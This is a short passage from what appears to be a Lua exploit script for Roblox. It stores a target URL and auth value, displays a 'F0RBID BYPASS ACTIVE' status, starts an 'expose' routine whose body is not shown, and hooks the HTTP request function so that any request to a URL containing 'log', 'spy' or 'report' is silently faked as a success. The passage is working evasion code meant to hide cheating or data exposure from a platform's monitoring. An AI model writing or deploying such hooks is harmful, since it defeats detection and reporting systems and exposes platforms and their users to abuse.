                TARGET_URL = u
                TARGET_AUTH = a
                Status.Text = "● STATUS: 🔴 F0RBID BYPASS ACTIVE"
                Status.TextColor3 = Color3.fromRGB(255, 0, 0)
                StartExpose()
            end
        end
        -- Block Tracking
        if args.Url:find("log") or args.Url:find("spy") or args.Url:find("report") then
            return {Success = true, StatusCode = 200, Body = "{}"}
        end
        return old(args)
    end)
end

